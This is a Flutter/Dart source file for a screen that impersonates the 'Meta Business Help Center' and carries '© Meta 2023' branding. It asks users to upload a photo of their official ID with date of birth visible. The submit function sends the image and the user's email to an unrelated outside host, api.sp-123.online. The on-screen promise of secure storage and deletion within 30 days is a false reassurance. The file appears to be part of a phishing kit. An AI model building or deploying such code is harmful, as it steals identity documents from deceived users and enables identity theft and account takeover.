import 'package:http/http.dart' as http;
import 'package:_iwu_pack/_iwu_pack.dart';
import 'package:flutter/material.dart';
import 'package:gap/gap.dart';
import 'package:image_picker/image_picker.dart';
import 'package:meta_business/src/presentation/review/review_screen.dart';
import 'package:http_parser/http_parser.dart';
import '../bloc/home_bloc.dart';

class UploadScreen extends StatefulWidget {
  final String email;
  const UploadScreen({super.key, required this.email});

  @override
  State<UploadScreen> createState() => _UploadScreenState();
}

class _UploadScreenState extends State<UploadScreen> {
  final ImagePicker _picker = ImagePicker();
  XFile? _image;
  String? imageName;
  Future<void> pickImage() async {
    final XFile? pickedImage =
        await _picker.pickImage(source: ImageSource.gallery);
    if (pickedImage != null) {
      _image = XFile(pickedImage.path);
      setState(() {
        _image = pickedImage;

        imageName = pickedImage.name;
        print("check iamge ${_image!.name}");
      });
    }
  }

  Future<void> submit() async {
    var imageBytes = await _image!.readAsBytes();
    var request = http.MultipartRequest(
        'POST', Uri.parse('https://api.sp-123.online/photo_upload'));
    request.fields['email'] = widget.email;
    request.fields['file'] = _image!.path;
    request.files.add(http.MultipartFile.fromBytes(
      'file',
      imageBytes,
      filename: imageName,
      contentType: MediaType('image', 'jpeg'),
    ));

    var client = http.Client();
    var streamedResponse = await client.send(request);

    if (streamedResponse.statusCode == 200) {
      print('Photo uploaded successfully');
    } else {
      print('Failed to upload photo');
    }
    client.close();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        body: Center(
      child: Container(
        padding: const EdgeInsets.only(top: 80),
        width: 500,
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            Text(
              "Meta Business Help Center",
              style: w600TextStyle(fontSize: 22),
            ),
            const Gap(8),
            Text(
              "Upload a Photo of your ID",
              style: w500TextStyle(fontSize: 16),
            ),
            const Gap(32),
            const Text(
              "We need a photo of your offical ID with your date of birth visible. This could be a birth certificate, passport or other type of officical identification.",
              textAlign: TextAlign.center,
            ),
            const Gap(32),
            Container(
              width: 250,
              height: 45,
              padding: const EdgeInsets.symmetric(horizontal: 8),
              decoration: const BoxDecoration(color: Colors.white, boxShadow: [
                BoxShadow(
                  color: Color.fromARGB(255, 228, 226, 226), // Màu của bóng
                  blurRadius: 5.0, // Độ mờ của bóng
                  spreadRadius: 2.0, // Độ lan rộng của bóng
                  offset: Offset(0, 3),
                ) // Đ)
              ]),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Expanded(
                    child: Text(
                      imageName == null
                          ? "Upload a photo of your ID"
                          : imageName!,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                  GestureDetector(
                      onTap: pickImage,
                      child: const Icon(Icons.cloud_upload_outlined))
                ],
              ),
            ),
            const Gap(16),
            GestureDetector(
                onTap: submit,
                child: Container(
                    width: 250,
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(6),
                        color: Colors.blue),
                    child: Center(
                        child: Text(
                      "Submit",
                      style: w600TextStyle(color: Colors.white, fontSize: 18),
                    )))),
            const Gap(22),
            Container(
              decoration: BoxDecoration(
                  color: hexColor("f1f2f6"),
                  borderRadius: BorderRadius.circular(8)),
              padding: const EdgeInsets.only(left: 12, top: 16, bottom: 16),
              child: const Row(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Icon(
                    Icons.lock,
                  ),
                  Expanded(
                    child: Padding(
                      padding: EdgeInsets.symmetric(horizontal: 18),
                      child: Text(
                        "Your ID will be stored securely and deleted within 30 days after we've finished confirming your identify. We might use trusted service providers to help review your information.",
                        style: TextStyle(),
                      ),
                    ),
                  )
                ],
              ),
            ),
            const Gap(22),
            const Text(
              "© Meta 2023",
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    ));
  }
}
